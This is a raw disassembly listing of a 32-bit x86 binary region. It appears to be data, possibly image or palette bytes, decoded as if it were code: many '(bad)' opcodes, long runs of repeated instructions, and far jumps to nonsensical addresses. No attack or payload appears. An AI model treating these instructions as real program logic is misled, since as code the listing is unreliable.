  40a406:	adc    BYTE PTR [eax],dl
  40a408:	mov    BYTE PTR [eax-0x77777778],cl
  40a40e:	mov    BYTE PTR [eax-0x7f777778],cl
  40a414:	adc    BYTE PTR [eax],dl
  40a416:	adc    BYTE PTR [eax],dl
  40a418:	adc    BYTE PTR [eax],dl
  40a41a:	adc    BYTE PTR [eax],dl
  40a41c:	adc    BYTE PTR [eax],dl
  40a41e:	adc    BYTE PTR [eax],dl
  40a420:	adc    BYTE PTR [eax],dl
  40a422:	adc    BYTE PTR [eax],dl
  40a424:	adc    BYTE PTR [eax],dl
  40a426:	adc    BYTE PTR [eax],dl
  40a428:	(bad)  
  40a429:	(bad)  
  40a42a:	(bad)  
  40a42b:	(bad)  
  40a42c:	inc    DWORD PTR [eax]
  40a42e:	add    BYTE PTR [eax],al
  40a430:	inc    DWORD PTR [eax]
  40a432:	add    BYTE PTR [eax],al
  40a434:	inc    DWORD PTR [eax]
  40a436:	add    BYTE PTR [eax],al
  40a438:	inc    DWORD PTR [eax]
  40a43a:	add    BYTE PTR [eax],al
  40a43c:	inc    DWORD PTR [eax]
  40a43e:	add    BYTE PTR [eax],al
  40a440:	inc    DWORD PTR [eax]
  40a442:	add    BYTE PTR [eax],al
  40a444:	inc    DWORD PTR [eax]
  40a446:	add    BYTE PTR [eax],al
  40a448:	inc    DWORD PTR [eax]
	...
  40a486:	add    bh,bh
  40a488:	add    BYTE PTR [eax],al
  40a48a:	add    bh,bh
  40a48c:	add    BYTE PTR [eax],al
  40a48e:	add    bh,bh
  40a490:	add    BYTE PTR [eax],al
  40a492:	add    bh,bh
  40a494:	add    BYTE PTR [eax],al
  40a496:	add    bh,bh
  40a498:	add    BYTE PTR [eax],al
  40a49a:	add    bh,bh
  40a49c:	add    BYTE PTR [eax],al
  40a49e:	add    bh,bh
  40a4a0:	add    BYTE PTR [eax],al
  40a4a2:	add    bh,bh
  40a4a4:	(bad)  
  40a4a5:	(bad)  
  40a4a6:	(bad)  
  40a4a7:	jmp    FWORD PTR [eax]
  40a4a9:	add    BYTE PTR [eax],al
  40a4ab:	add    BYTE PTR [eax],dl
  40a4ad:	add    BYTE PTR [eax],al
  40a4af:	add    BYTE PTR [eax],ah
  40a4b1:	add    BYTE PTR [eax],al
  40a4b3:	add    BYTE PTR [ecx],al
  40a4b5:	add    BYTE PTR [eax+eax*1],al
	...
  40a4d8:	add    BYTE PTR [eax-0x80000000],al
  40a4de:	add    BYTE PTR [eax],0x80
  40a4e1:	add    BYTE PTR [eax],al
  40a4e3:	add    BYTE PTR [eax-0x7fff8000],al
  40a4e9:	add    BYTE PTR [eax],0x0
  40a4ec:	rol    al,0xc0
  40a4ef:	add    BYTE PTR [eax+0x8080],al
  40a4f5:	add    bh,bh
  40a4f7:	add    BYTE PTR [eax],al
  40a4f9:	inc    DWORD PTR [eax]
  40a4fb:	add    BYTE PTR [eax],al
  40a4fd:	(bad)  
  40a4fe:	inc    DWORD PTR [eax]
  40a500:	inc    DWORD PTR [eax]
  40a502:	add    BYTE PTR [eax],al
  40a504:	inc    DWORD PTR [eax]
  40a506:	inc    DWORD PTR [eax]
  40a508:	(bad)  
  40a509:	inc    DWORD PTR [eax]
  40a50b:	add    bh,bh
  40a50d:	(bad)  
  40a50e:	inc    DWORD PTR [eax]
  40a510:	adc    DWORD PTR [ecx],edx
  40a512:	add    BYTE PTR [eax],al
  40a514:	add    BYTE PTR [eax],al
  40a516:	add    BYTE PTR [eax],al
  40a518:	adc    DWORD PTR [ecx],edx
  40a51a:	xchg   DWORD PTR [edi+0x77],esi
  40a51d:	ja     0x40a596
  40a51f:	jo     0x40a532
  40a521:	adc    DWORD PTR [edi-0x1],ecx
  40a527:	jo     0x40a53a
  40a529:	adc    DWORD PTR [edi-0x6006d00e],ecx
  40a52f:	jo     0x40a542
  40a531:	adc    DWORD PTR [edi-0x6064d0d5],ecx
  40a537:	jo     0x40a539
  40a539:	add    BYTE PTR [edi-0x2002d05e],cl
  40a53f:	jo     0x40a4c8
  40a541:	ja     0x40a4d2
  40a543:	(bad)  
  40a544:	(bad)  
  40a545:	(bad)  
  40a546:	push   DWORD PTR [eax-0x71]
  40a549:	inc    DWORD PTR [edi+0x77777777]
  40a54f:	jo     0x40a4e0
  40a551:	lahf   
  40a552:	xchg   esp,eax
  40a553:	inc    esp
  40a554:	inc    esp
  40a555:	inc    esp
  40a556:	inc    esp
  40a557:	inc    eax
  40a558:	(bad)  
  40a559:	stc    
  40a55a:	xchg   esp,eax
  40a55b:	inc    esp
  40a55c:	inc    esp
  40a55d:	inc    esp
  40a55e:	inc    esp
  40a55f:	inc    eax
  40a560:	(bad)  
  40a561:	cdq    
  40a562:	stc    
  40a563:	cwde   
  40a564:	mov    BYTE PTR [eax-0x707f78],cl
  40a56a:	lahf   
  40a56b:	(bad)  
  40a56c:	push   DWORD PTR [eax+0x11]
  40a56f:	adc    DWORD PTR [edi+0x77779777],eax
  40a575:	jo     0x40a588
  40a577:	adc    DWORD PTR [esp+eax*2+0x40444444],eax
  40a57e:	adc    DWORD PTR [ecx],edx
  40a580:	test   BYTE PTR [esp+eax*2+0x44],al
  40a584:	inc    esp
  40a585:	inc    eax
  40a586:	adc    DWORD PTR [ecx],edx
  40a588:	mov    BYTE PTR [eax-0x7f777778],cl
  40a58e:	adc    DWORD PTR [ecx],edx
  40a590:	lock add BYTE PTR [eax],dl
  40a593:	adc    al,dh
  40a595:	add    bl,bl
  40a597:	fcomip st,st(0)
  40a599:	add    BYTE PTR [ebx+0x1f00f0ff],dh
  40a59f:	jo     0x40a591
  40a5a1:	add    BYTE PTR [eax],al
  40a5a3:	add    BYTE PTR [eax],al
  40a5a5:	add    ch,bh
  40a5a7:	fild   WORD PTR [eax]
  40a5a9:	add    BYTE PTR [ebx],dh
  40a5ab:	inc    DWORD PTR [eax]
  40a5ad:	add    BYTE PTR [edi],bl
  40a5af:	jo     0x40a5b1
  40a5b1:	add    BYTE PTR [edi+0x77],dh
  40a5b4:	add    BYTE PTR [eax],al
  40a5b6:	(bad)  
  40a5b7:	inc    DWORD PTR [eax]
  40a5b9:	add    bh,bh
  40a5bb:	inc    DWORD PTR [eax]
  40a5bd:	ud0    esi,DWORD PTR [eax+0x0]
  40a5c1:	ud0    edi,edi
  40a5c4:	add    BYTE PTR [edi],cl
  40a5c6:	mov    BYTE PTR [edi-0x77f100],cl
  40a5cc:	add    BYTE PTR [edi],cl
  40a5ce:	(bad)  
  40a5cf:	jo     0x40a5f9
  40a5d1:	add    BYTE PTR [eax],al
  40a5d3:	add    BYTE PTR [eax],dh
  40a5d5:	add    BYTE PTR [eax],al
  40a5d7:	add    BYTE PTR [eax+0x0],ah
  40a5da:	add    BYTE PTR [eax],al
  40a5dc:	add    DWORD PTR [eax],eax
  40a5de:	or     BYTE PTR [eax],al
	...
  40a5f8:	jp     0x40a660
  40a5fa:	add    BYTE PTR [eax],0x0
  40a5fd:	add    BYTE PTR [eax],al
  40a5ff:	add    bh,bh
  40a601:	lock inc DWORD PTR [eax]
  40a604:	(bad)  
  40a605:	cli    
  40a606:	inc    DWORD PTR [eax]
  40a608:	(bad)  
  40a609:	std    
  40a60a:	inc    DWORD PTR [eax]
  40a60c:	(bad)  
  40a60d:	fdivp  st(5),st
  40a60f:	add    bh,bh
  40a611:	retf   
  40a612:	cmc    
  40a613:	add    BYTE PTR [edi+eax*4-0x3a00ff78],cl
  40a61a:	into   
  40a61b:	add    bh,bh
  40a61d:	mov    esp,0xa9ff00c5
  40a622:	mov    bl,0x0
  40a624:	std    
  40a625:	int3   
  40a626:	rol    BYTE PTR [eax],cl
  40a628:	push   DWORD PTR [ebx-0x1b00ff47]
  40a62e:	out    0x0,al
  40a630:	push   DWORD PTR [ebx+0x6f9800b6]
  40a636:	jo     0x40a638
  40a638:	hlt    
  40a639:	mov    edx,0x99ff00bb
  40a63e:	cdq    
  40a63f:	add    bh,bh
  40a641:	fwait
  40a642:	fwait
  40a643:	add    dl,dh
  40a645:	xchg   ebx,eax
  40a646:	xchg   ebx,eax
  40a647:	add    bh,bh
  40a649:	sahf   
  40a64a:	sahf   
  40a64b:	add    bh,bh
  40a64d:	mov    eax,ds:0x9df900a0
  40a652:	popf   
  40a653:	add    ah,cl
  40a655:	add    BYTE PTR [edx-0x5b5b0100],0x0
  40a65c:	xlat   BYTE PTR ds:[ebx]
  40a65d:	mov    ecx,DWORD PTR [edx-0x58580100]
  40a663:	add    cl,bh
  40a665:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a666:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a667:	add    bh,bh
  40a669:	stos   BYTE PTR es:[edi],al
  40a66a:	stos   BYTE PTR es:[edi],al
  40a66b:	add    dh,ah
  40a66d:	cdq    
  40a66e:	cdq    
  40a66f:	add    BYTE PTR [ecx-0xff999a],bl
  40a675:	lods   eax,DWORD PTR ds:[esi]
  40a676:	lods   eax,DWORD PTR ds:[esi]
  40a677:	add    dl,dh
  40a679:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a67a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a67b:	add    BYTE PTR [ebp-0x6ff9a9b],dl
  40a681:	stos   BYTE PTR es:[edi],al
  40a682:	stos   BYTE PTR es:[edi],al
  40a683:	add    BYTE PTR [ecx-0xffa1a2],cl
  40a689:	mov    al,0xb0
  40a68b:	add    BYTE PTR [ecx+esi*2-0x4c00ff8f],ah
  40a692:	mov    bl,0x0
  40a694:	jns    0x40a6eb
  40a696:	push   ebp
  40a697:	add    bh,bh
  40a699:	mov    ch,0xb5
  40a69b:	add    BYTE PTR [edx+edi*2+0x719f007a],ch
  40a6a2:	jno    0x40a6a4
  40a6a4:	mov    ch,0x82
  40a6a6:	add    BYTE PTR [eax],0xff
  40a6a9:	mov    ecx,0xaff200b9
  40a6ae:	scas   eax,DWORD PTR es:[edi]
  40a6af:	add    bh,bh
  40a6b1:	mov    edx,0x8cc000ba
  40a6b6:	mov    WORD PTR [eax],es
  40a6b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a6b9:	jns    0x40a734
  40a6bb:	add    ah,bh
  40a6bd:	mov    ecx,0x6d9300b9
  40a6c2:	ins    DWORD PTR es:[edi],dx
  40a6c3:	add    bh,bh
  40a6c5:	mov    esi,0xc0ff00be
  40a6ca:	rol    BYTE PTR [eax],0xff
  40a6cd:	(bad)
  40a6d0:	inc    edi
  40a6d2:	mov    DWORD PTR [eax],0x46465a
  40a6d8:	mov    bh,0x8f
  40a6da:	pop    DWORD PTR [eax]
  40a6dc:	dec    ebx
  40a6de:	retf   
  40a6df:	add    bh,bh
  40a6e1:	int3   
  40a6e2:	int3   
  40a6e3:	add    bh,bh
  40a6e5:	rcl    al,1
  40a6e7:	add    dl,dh
  40a6e9:	(bad)
  40a6ec:	call   edx
  40a6ee:	rol    BYTE PTR [eax],cl
  40a6f0:	retf   0xa6a6
  40a6f3:	add    BYTE PTR [esi-0x50ff6263],bh
  40a6f9:	xchg   edx,eax
  40a6fa:	xchg   edx,eax
  40a6fb:	add    BYTE PTR [ecx+0x3d],cl
  40a6fe:	cmp    eax,0xd6d6ff00
  40a703:	add    BYTE PTR [eax+0x65],bh
  40a706:	gs add al,ch
  40a709:	(bad)  
  40a70a:	les    eax,FWORD PTR [eax]
  40a70c:	(bad)  
  40a70d:	(bad)  
  40a70f:	add    bh,bh
  40a711:	fstp   st(5)
  40a713:	add    dl,dl
  40a715:	mov    bh,0xb7
  40a717:	add    bh,bh
  40a719:	loop   0x40a6fd
  40a71b:	add    BYTE PTR [esi+0x64],ch
  40a71e:	fs add bh,bh
  40a721:	jmp    0xc719a80f
  40a726:	mov    BYTE PTR [eax],0xfa
  40a729:	out    0xe7,eax
  40a72b:	add    bh,bh
  40a72d:	out    dx,al
  40a72e:	out    dx,al
  40a72f:	add    ah,dh
  40a731:	jecxz  0x40a716
  40a733:	add    dh,bl
  40a735:	rcl    al,1
  40a737:	add    dh,ah
  40a739:	(bad)  
  40a73b:	add    dl,ah
  40a73d:	aad    0xd5
  40a73f:	add    bh,bh
  40a741:	cmc    
  40a742:	cmc    
  40a743:	add    bh,bh
  40a745:	stc    
  40a746:	stc    
  40a747:	add    bh,bh
  40a749:	cld    
  40a74a:	cld    
  40a74b:	add    BYTE PTR [edx+0x49],cl
  40a74e:	dec    ecx
  40a74f:	add    bh,ah
  40a751:	in     eax,0xe5
  40a753:	add    BYTE PTR [esi+0x55],dl
  40a756:	push   ebp
  40a757:	add    ah,bh
  40a759:	sti    
  40a75a:	sti    
  40a75b:	add    bh,dh
  40a75d:	div    dh
  40a75f:	add    dl,dl
  40a761:	rcl    ecx,1
  40a763:	add    BYTE PTR [edi-0x54ff9494],bl
  40a769:	jne    0x40a7df
  40a76b:	add    ah,dl
  40a76d:	popf   
  40a76e:	fwait
  40a76f:	add    bh,al
  40a771:	xchg   ebx,eax
  40a772:	xchg   edx,eax
  40a773:	add    cl,bh
  40a775:	rol    eax,0x0
  40a778:	stc    
  40a779:	mov    ch,0x0
  40a77c:	stc    
  40a77d:	retf   
  40a77e:	retf   0xf300
  40a781:	rcl    edx,cl
  40a783:	add    BYTE PTR [ebx-0x4aff9391],ah
  40a789:	jg     0x40a807
  40a78b:	add    BYTE PTR [ebx-0x76ff7c7a],bh
  40a791:	data16 add BYTE PTR fs:[ebp-0x25ff7e7d],ch
  40a799:	stos   BYTE PTR es:[edi],al
  40a79a:	test   al,0x0
  40a79c:	out    0xbd,al
  40a79e:	mov    ebx,0xcdcff600
  40a7a3:	add    dh,ch
  40a7a5:	xlat   BYTE PTR ds:[ebx]
  40a7a6:	(bad)  
  40a7a7:	add    dl,dl
  40a7a9:	mov    edi,0xb0e700be
  40a7ae:	lods   al,BYTE PTR ds:[esi]
  40a7af:	add    dh,cl
  40a7b1:	mov    dl,0xb0
  40a7b3:	add    BYTE PTR [ecx-0xff9995],bl
  40a7b9:	int3   
  40a7ba:	mov    DWORD PTR [eax],0xe3e4ee
  40a7c0:	retf   0xb3b6
  40a7c3:	add    ah,dh
  40a7c5:	in     eax,dx
  40a7c6:	in     al,dx
  40a7c7:	add    bh,bh
  40a7c9:	int3   
  40a7ca:	ret    0xb900
  40a7cd:	stos   DWORD PTR es:[edi],eax
  40a7ce:	test   al,0x0
  40a7d0:	jmp    0xadbd:0xf000d9dc
  40a7d7:	add    BYTE PTR [ebx-0xff9d8b],ch
  40a7dd:	int3   
  40a7de:	mov    ebx,0xacc1f400
  40a7e3:	add    bh,bl
  40a7e5:	lods   al,BYTE PTR ds:[esi]
  40a7e6:	xchg   esp,eax
  40a7e7:	add    BYTE PTR [ecx+edi*2-0x3300ffa0],ch
  40a7ee:	mov    bl,0x0
  40a7f0:	mov    ebx,0xe4e600c1
  40a7f6:	jecxz  0x40a7f8
  40a7f8:	mov    ch,0x7e
  40a7fa:	pop    esi
  40a7fb:	add    ah,cl
  40a7fd:	xchg   edx,eax
  40a7fe:	jo     0x40a800
  40a800:	(bad)  
  40a801:	mov    edx,0xccff0091
  40a806:	lods   al,BYTE PTR ds:[esi]
  40a807:	add    cl,cl
  40a809:	stos   BYTE PTR es:[edi],al
  40a80a:	cwde   
  40a80b:	add    ch,ah
  40a80d:	mov    edi,0xa5b300a6
  40a812:	pushf  
  40a813:	add    BYTE PTR [ecx-0x12ff4b4a],bh
  40a819:	mov    dh,0x8d
  40a81b:	add    bh,bh
  40a81d:	lds    ebx,FWORD PTR [ecx-0x593b1400]
  40a823:	add    al,bl
  40a825:	mov    ecx,0xc2f700a1
  40a82a:	xchg   edi,eax
  40a82b:	add    bh,bh
  40a82d:	int3   
  40a82e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a82f:	add    ah,cl
  40a831:	mov    dl,0x9c
  40a833:	add    bh,bh
  40a835:	leave  
  40a836:	cdq    
  40a837:	add    BYTE PTR [ebp-0x14ff8782],al
  40a83d:	loopne 0x40a815
  40a83f:	add    bh,bh
  40a841:	retf   0x94
  40a844:	dec    esp
  40a846:	cdq    
  40a847:	add    bh,bh
  40a849:	int    0x9e
  40a84b:	add    dh,bh
  40a84d:	shl    DWORD PTR [edi-0x4a250100],cl
  40a853:	add    dh,ah
  40a855:	int3   
  40a856:	mov    bl,0x0
  40a858:	(bad)  
  40a859:	jmp    0xe1:0xf0ff00d5
  40a860:	out    dx,al
  40a861:	loop   0x40a839
  40a863:	add    bh,bh
  40a865:	stc    
  40a866:	repz add dh,dh
  40a869:	icebp  
  40a86a:	in     al,dx
  40a86b:	add    ah,ch
  40a86d:	call   0x9817a956
  40a872:	push   ebx
  40a873:	add    bh,bh
  40a875:	mov    BYTE PTR [edi-0x3f1f0100],0x0
  40a87c:	(bad)  
  40a87d:	in     al,0xc9
  40a87f:	add    BYTE PTR [edx-0xff7063],ch
  40a885:	cmc    
  40a886:	jmp    0xff00:0x578dc00
  40a88d:	mov    esp,0xbeff0069
  40a892:	jo     0x40a894
  40a894:	repnz mov bh,0x6e
  40a897:	add    dh,ah
  40a899:	lods   al,BYTE PTR ds:[esi]
  40a89a:	imul   eax,DWORD PTR [eax],0x75c0ff
  40a8a0:	inc    edx
  40a8a2:	jnp    0x40a8a4
  40a8a4:	jmp    0x8fcb:0xfc0079b7
  40a8ab:	add    cl,ah
  40a8ad:	rcr    DWORD PTR [ebx-0x331d0c00],0x0
  40a8b4:	in     al,0xde
  40a8b6:	xlat   BYTE PTR ds:[ebx]
  40a8b7:	add    cl,ch
  40a8b9:	in     al,0xde
  40a8bb:	add    ah,bh
  40a8bd:	mov    dl,0x4d
  40a8bf:	add    dh,bh
  40a8c1:	mov    dh,0x59
  40a8c3:	add    bh,bh
  40a8c5:	mov    ebx,0xd1fb0064
  40a8ca:	cdq    
  40a8cb:	add    bh,ah
  40a8cd:	shl    BYTE PTR [edx-0x35211300],1
  40a8d3:	add    ch,dl
  40a8d5:	leave  
  40a8d6:	mov    ecx,0x595f900
  40a8db:	add    bh,bh
  40a8dd:	mov    ds:0xaafb001b,al
  40a8e2:	xor    al,0x0
  40a8e4:	repnz mov edi,0xc4f70075
  40a8ea:	js     0x40a8ec
  40a8ec:	sti    
  40a8ed:	enter  0x7c,0xf6
  40a8f1:	iret   
  40a8f2:	xchg   esi,eax
  40a8f3:	add    bl,ch
  40a8f5:	retf   
  40a8f6:	fwait
  40a8f7:	add    ah,ch
  40a8f9:	shr    DWORD PTR [esi-0x49240b00],cl
  40a8ff:	add    bh,bh
  40a901:	std    
  40a902:	cli    
  40a903:	add    bl,ch
  40a905:	mov    ecx,0xf8fe006d
  40a90a:	out    dx,al
  40a90b:	add    bl,dh
  40a90d:	in     eax,dx
  40a90e:	jecxz  0x40a910
  40a910:	mov    ebp,0xc300babc
  40a915:	scas   al,BYTE PTR es:[edi]
  40a916:	jnp    0x40a918
  40a918:	(bad)  
  40a91a:	aad    0x0
  40a91c:	push   0x75
  40a91e:	dec    eax
  40a91f:	add    BYTE PTR [edi-0x40ffa94e],cl
  40a925:	(bad)  [esi+0x33804d00]
  40a92b:	add    BYTE PTR [eax-0x4e],bl
  40a92e:	inc    esi
  40a92f:	add    BYTE PTR [eax+0x260074c6],al
  40a935:	mov    WORD PTR [edx],ds
  40a937:	add    BYTE PTR [edx],al
  40a939:	call   0x16:0xa80f0003
  40a940:	pop    ss
  40a941:	mov    al,0x23
  40a943:	add    BYTE PTR [ebx],ah
  40a945:	mov    bh,0x30
  40a947:	add    BYTE PTR [eax],ch
  40a949:	sar    DWORD PTR [eax+eax*1],0x35
  40a94d:	into   
  40a94e:	push   ecx
  40a94f:	add    BYTE PTR [eax-0x1f],cl
  40a952:	ins    DWORD PTR es:[edi],dx
  40a953:	add    BYTE PTR [ebx-0xf],bl
  40a956:	nop
  40a957:	add    BYTE PTR [edi+0x5200e1df],ah
  40a95d:	int    0xd4
  40a95f:	add    BYTE PTR [eax],ah
  40a961:	nop
  40a962:	test   eax,0xfcae4900
  40a967:	add    BYTE PTR [edx+0x3500d7b1],cl
  40a96d:	xchg   ebp,eax
  40a96e:	stc    
  40a96f:	add    BYTE PTR [esp+ebp*2-0x46],cl
  40a973:	add    bh,bh
  40a975:	(bad)  
  40a976:	inc    DWORD PTR [eax]
  40a978:	stc    
  40a979:	stc    
  40a97a:	stc    
  40a97b:	add    dl,dh
  40a97d:	repnz repnz add dh,ch
  40a981:	out    dx,al
  40a982:	out    dx,al
  40a983:	add    bl,ch
  40a985:	jmp    0x40a972
  40a987:	add    cl,ch
  40a989:	jmp    0xe726aa77
  40a98e:	out    0x0,al
  40a990:	in     al,0xe4
  40a992:	in     al,0x0
  40a994:	loop   0x40a978
  40a996:	loop   0x40a998
  40a998:	loopne 0x40a97a
  40a99a:	loopne 0x40a99c
  40a99c:	(bad)  
  40a99e:	fiadd  WORD PTR [eax]
  40a9a0:	(bad)  
  40a9a2:	fadd   QWORD PTR [eax]
  40a9a4:	fcmovu st,st(2)
  40a9a6:	fiadd  DWORD PTR [eax]
  40a9a8:	(bad)  
  40a9a9:	(bad)  
  40a9aa:	(bad)  
  40a9ab:	add    ah,cl
  40a9ad:	int3   
  40a9ae:	int3   
  40a9af:	add    dh,al
  40a9b1:	mov    dh,0x0
  40a9b4:	rol    ecx,0xc1
  40a9b7:	add    BYTE PTR [esi-0x44ff4142],bh
  40a9bd:	mov    ebx,0xb9b900bb
  40a9c2:	mov    ecx,0xb5b5b500
  40a9c7:	add    BYTE PTR [edi-0x5dff5051],ch
  40a9cd:	mov    ds:0x949400a2,al
  40a9d2:	xchg   esp,eax
  40a9d3:	add    BYTE PTR [ebp+0x7d],bh
  40a9d6:	jge    0x40a9d8
  40a9d8:	jb     0x40aa4c
  40a9da:	jb     0x40a9dc
  40a9dc:	addr16 addr16 add BYTE PTR [si+0x64],ah
  40a9e2:	add    BYTE PTR fs:[ebp+0x5d],bl
  40a9e6:	pop    ebp
  40a9e7:	add    BYTE PTR ds:0x36003d3d,bh
  40a9ed:	ss add BYTE PTR ss:[eax],dh
  40a9f1:	xor    BYTE PTR [eax],dh
  40a9f3:	add    BYTE PTR [eax],al
  40a9f5:	add    BYTE PTR [eax],al
  40a9f7:	add    BYTE PTR [ecx],al
  40a9f9:	add    DWORD PTR [ecx],eax
  40a9fb:	add    DWORD PTR [ecx],eax
  40a9fd:	add    DWORD PTR [ecx],eax
  40a9ff:	add    DWORD PTR [ecx],eax
  40aa01:	push   edi
  40aa02:	cli    
  40aa03:	cli    
  40aa04:	add    DWORD PTR [ecx],eax
  40aa06:	add    DWORD PTR [ecx],eax
  40aa08:	add    DWORD PTR [ecx],eax
  40aa0a:	add    DWORD PTR [ecx],eax
  40aa0c:	add    DWORD PTR [ecx],eax
  40aa0e:	add    DWORD PTR [ecx],eax
  40aa10:	add    DWORD PTR [ecx],eax
  40aa12:	add    DWORD PTR [ecx],eax
  40aa14:	add    DWORD PTR [ecx],eax
  40aa16:	add    DWORD PTR [ecx],eax
  40aa18:	add    DWORD PTR [ecx],eax
  40aa1a:	add    DWORD PTR [ecx],eax
  40aa1c:	add    DWORD PTR [ecx],eax
  40aa1e:	add    DWORD PTR [ecx],eax
  40aa20:	add    DWORD PTR [ecx],eax
  40aa22:	add    DWORD PTR [ecx],eax
  40aa24:	add    DWORD PTR [ecx],eax
  40aa26:	add    DWORD PTR [ecx],eax
  40aa28:	add    DWORD PTR [ecx],eax
  40aa2a:	add    DWORD PTR [ecx],eax
  40aa2c:	add    DWORD PTR [ecx],eax
  40aa2e:	add    edx,edi
  40aa30:	sti    
  40aa31:	push   edi
  40aa32:	push   ebp
  40aa33:	cld    
  40aa34:	(bad)  
  40aa35:	cld    
  40aa36:	cli    
  40aa37:	cli    
  40aa38:	cli    
  40aa39:	add    DWORD PTR [ecx],eax
  40aa3b:	add    DWORD PTR [ecx],eax
  40aa3d:	add    DWORD PTR [ecx],eax
  40aa3f:	add    DWORD PTR [ecx],eax
  40aa41:	add    DWORD PTR [ecx],eax
  40aa43:	add    DWORD PTR [ecx],eax
  40aa45:	clc    
  40aa46:	clc    
  40aa47:	cli    
  40aa48:	cli    
  40aa49:	cli    
  40aa4a:	clc    
  40aa4b:	clc    
  40aa4c:	add    DWORD PTR [ecx],eax
  40aa4e:	add    DWORD PTR [ecx],eax
  40aa50:	add    DWORD PTR [ecx],eax
  40aa52:	add    DWORD PTR [ecx],eax
  40aa54:	add    DWORD PTR [ecx],eax
  40aa56:	add    DWORD PTR [ecx],eax
  40aa58:	add    DWORD PTR [ecx],eax
  40aa5a:	add    DWORD PTR [ecx],eax
  40aa5c:	add    DWORD PTR [ecx],eax
  40aa5e:	cli    
  40aa5f:	imul   ebx
  40aa61:	pop    edx
  40aa62:	repz pop es
  40aa64:	cli    
  40aa65:	push   edi
  40aa66:	push   ebp
  40aa67:	cld    
  40aa68:	std    
  40aa69:	(bad)  
  40aa6a:	push   edi
  40aa6b:	cli    
  40aa6c:	cli    
  40aa6d:	add    DWORD PTR [ecx],eax
  40aa6f:	add    DWORD PTR [ecx],eax
  40aa71:	add    DWORD PTR [ecx],eax
  40aa73:	push   edi
  40aa74:	aaa    
  40aa75:	daa    
  40aa76:	daa    
  40aa77:	daa    
  40aa78:	daa    
  40aa79:	daa    
  40aa7a:	aaa    
  40aa7b:	inc    ecx
  40aa7c:	(bad)  
  40aa7d:	push   ebp
  40aa7e:	add    DWORD PTR [ecx],eax
  40aa80:	add    DWORD PTR [ecx],eax
  40aa82:	add    DWORD PTR [ecx],eax
  40aa84:	add    DWORD PTR [ecx],eax
  40aa86:	add    DWORD PTR [ecx],eax
  40aa88:	add    DWORD PTR [ecx],eax
  40aa8a:	add    DWORD PTR [ecx],eax
  40aa8c:	add    edx,edi
  40aa8e:	imul   ch
  40aa90:	push   esi
  40aa91:	ret    0xc2c2
  40aa94:	ret    0xc6c8
  40aa97:	div    bh
  40aa99:	sti    
  40aa9a:	push   edi
  40aa9b:	push   ebp
  40aa9c:	std    
  40aa9d:	(bad)  
  40aa9e:	cld    
  40aa9f:	clc    
  40aaa0:	add    DWORD PTR [ebx+0x23],eax
  40aaa3:	pop    ebx
  40aaa4:	das    
  40aaa5:	imul   ebp,DWORD PTR ds:[ecx+0x44],0x2321383e
  40aaad:	aaa    
  40aaae:	(bad)  
  40aaaf:	push   edi
  40aab0:	add    DWORD PTR [ecx],eax
  40aab2:	add    DWORD PTR [ecx],eax
  40aab4:	add    DWORD PTR [ecx],eax
  40aab6:	add    DWORD PTR [ecx],eax
  40aab8:	add    DWORD PTR [ecx],eax
  40aaba:	add    DWORD PTR [ecx],eax
  40aabc:	stc    
  40aabd:	hlt    
  40aabe:	pop    edx
  40aabf:	pop    edx
  40aac0:	jg     0x40ab15
  40aac2:	push   ebx
  40aac3:	push   ebx
  40aac4:	push   ebx
  40aac5:	push   ebx
  40aac6:	push   ebx
  40aac7:	push   ebx
  40aac8:	push   ebx
  40aac9:	popf   
  40aaca:	jle    0x40aa6e
  40aacc:	nop
  40aacd:	stc    
  40aace:	push   edi
  40aacf:	push   ebp
  40aad0:	daa    
  40aad1:	and    eax,0x3936345d
  40aad6:	cmp    eax,0x4a484645
  40aadb:	dec    esi
  40aadc:	ins    BYTE PTR es:[edi],dx
  40aadd:	xor    BYTE PTR [ebx],ah
  40aadf:	inc    ecx
  40aae0:	inc    BYTE PTR [ecx]
  40aae2:	add    DWORD PTR [ecx],eax
  40aae4:	add    DWORD PTR [ecx],eax
  40aae6:	add    DWORD PTR [ecx],eax
  40aae8:	add    DWORD PTR [ecx],eax
  40aaea:	add    DWORD PTR [edi],eax
  40aaec:	out    dx,al
  40aaed:	pop    edx
  40aaee:	in     eax,dx
  40aaef:	in     eax,dx
  40aaf0:	jg     0x40aa8d
  40aaf2:	fwait
  40aaf3:	fwait
  40aaf4:	fwait
  40aaf5:	fwait
  40aaf6:	fwait
  40aaf7:	fwait
  40aaf8:	fwait
  40aaf9:	fwait
  40aafa:	cwde   
  40aafb:	xchg   ebx,eax
  40aafc:	xchg   ebx,eax
  40aafd:	xchg   esp,eax
  40aafe:	(bad)  
  40aaff:	and    DWORD PTR [edx+eiz*1+0x28],esp
  40ab03:	cs xor al,0x36
  40ab06:	cmp    DWORD PTR ds:0x4a484645,edi
  40ab0c:	dec    ebp
  40ab0d:	push   esp
  40ab0e:	jb     0x40ab2e
  40ab10:	aaa    
  40ab11:	inc    BYTE PTR [ecx]
  40ab13:	add    DWORD PTR [ecx],eax
  40ab15:	add    DWORD PTR [ecx],eax
  40ab17:	add    DWORD PTR [ecx],eax
  40ab19:	add    DWORD PTR [ecx],eax
  40ab1b:	cmc    
  40ab1c:	in     al,dx
  40ab1d:	icebp  
  40ab1e:	cmc    
  40ab1f:	out    dx,eax
  40ab20:	mov    al,0xa3
  40ab22:	mov    ds:0xa3a3a3a3,eax
  40ab27:	mov    ds:0x8f94a3a3,eax
  40ab2c:	(bad)
  40ab30:	sbb    BYTE PTR [esp],bl
  40ab33:	sub    BYTE PTR [esi],ch
  40ab35:	xor    al,0x36
  40ab37:	cmp    DWORD PTR ds:0x4a484645,edi
  40ab3d:	(bad)  
  40ab3f:	jno    0x40ab6b
  40ab41:	aaa    
  40ab42:	inc    BYTE PTR [ecx]
  40ab44:	add    DWORD PTR [ecx],eax
  40ab46:	add    DWORD PTR [ecx],eax
  40ab48:	add    DWORD PTR [ecx],eax
  40ab4a:	add    ebp,esi
  40ab4c:	repz cmc 
  40ab4e:	out    dx,al
  40ab4f:	pop    edx
  40ab50:	mov    al,0xa3
  40ab52:	mov    ds:0xcbcecda3,eax
  40ab57:	pushf  
  40ab58:	mov    ds:0x8c8f8fa1,eax
  40ab5d:	arpl   WORD PTR [edi],dx
